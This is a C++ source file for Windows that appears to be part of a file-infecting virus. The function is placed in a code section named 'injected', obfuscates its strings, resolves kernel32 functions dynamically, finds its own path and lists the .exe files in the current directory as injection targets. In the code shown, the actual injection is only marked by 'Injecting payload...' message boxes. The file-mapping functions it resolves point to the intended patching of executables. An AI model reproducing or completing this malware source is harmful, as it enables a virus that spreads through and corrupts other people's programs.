#include "payload.h"
#include <Windows.h>
#include "libproc.hpp"

EXTERN_C_START
extern VOID payload();
extern ULONGLONG code_size;
EXTERN_C_END

__declspec(code_seg("injected")) VOID inj_code_c() {
    DECLARE_OBFUSCATED(user32, "USER32.DLL");
    DECLARE_OBFUSCATED(mbTitle, "Hello");
    DECLARE_OBFUSCATED(mbText, "Hello, world!");
    DECLARE_OBFUSCATED(exeExt, "*.exe");
    DECLARE_OBFUSCATED(mbInjecting, "Injecting payload...");
    DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
    DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
    DECLARE_OBFUSCATED(errAlloc, "Error allocating memory");
    DECLARE_OBFUSCATED(errFindFile, "Error finding .exe files");

    CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
    CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
    CONST auto pGetModuleFileNameA = GET_FUNC(pKernel32Dll, GetModuleFileNameA);
    CONST auto pCreateFileA = GET_FUNC(pKernel32Dll, CreateFileA);
    CONST auto pGetFileSize = GET_FUNC(pKernel32Dll, GetFileSize);
    CONST auto pCreateFileMappingA = GET_FUNC(pKernel32Dll, CreateFileMappingA);
    CONST auto pMapViewOfFile = GET_FUNC(pKernel32Dll, MapViewOfFile);
    CONST auto pVirtualProtect = GET_FUNC(pKernel32Dll, VirtualProtect);
    CONST auto pFlushViewOfFile = GET_FUNC(pKernel32Dll, FlushViewOfFile);
    CONST auto pUnmapViewOfFile = GET_FUNC(pKernel32Dll, UnmapViewOfFile);
    CONST auto pCloseHandle = GET_FUNC(pKernel32Dll, CloseHandle);
    CONST auto pGetCurrentDirectoryA = GET_FUNC(pKernel32Dll, GetCurrentDirectoryA);
    CONST auto pFindFirstFileA = GET_FUNC(pKernel32Dll, FindFirstFileA);
    CONST auto pFindNextFileA = GET_FUNC(pKernel32Dll, FindNextFileA);
    CONST auto pFindClose = GET_FUNC(pKernel32Dll, FindClose);
    // CONST auto pLocalAlloc = GET_FUNC(pKernel32Dll, LocalAlloc);
    // CONST auto pLocalFree = GET_FUNC(pKernel32Dll, LocalFree);

    CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
    CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);

    CHAR sModuleName[MAX_PATH];
    DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
    if (res == 0 || res >= sizeof(sModuleName)) {
        pMessageBoxA(NULL, DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
        return;
    }
    pMessageBoxA(NULL, sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);

    CHAR sDirName[MAX_PATH];
    CHAR sFindPath[MAX_PATH];
    res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
    if (res == 0 || res >= sizeof(sDirName)) {
        pMessageBoxA(NULL, DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
        return;
    }
    my_strappend(sDirName, '\\');
    my_strcpy(sFindPath, sDirName);
    my_strcat(sFindPath, DEOBF(exeExt));
    pMessageBoxA(NULL, sFindPath, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);

    CHAR sFilePath[MAX_PATH];
    LPSTR sDirEnd = my_strcpy(sFilePath, sDirName) - 1;

    WIN32_FIND_DATAA findData;
    HANDLE hFind = pFindFirstFileA(sFindPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        pMessageBoxA(NULL, DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
        return;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        my_strcpy(sDirEnd, findData.cFileName);
        if (!my_stricmp(sFilePath, sModuleName)) {
            pMessageBoxA(NULL, sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONWARNING);
            continue;
        }
        pMessageBoxA(NULL, sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONINFORMATION);
    } while (pFindNextFileA(hFind, &findData));

    pFindClose(hFind);

    // pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle), MB_OKCANCEL | MB_ICONINFORMATION);
}
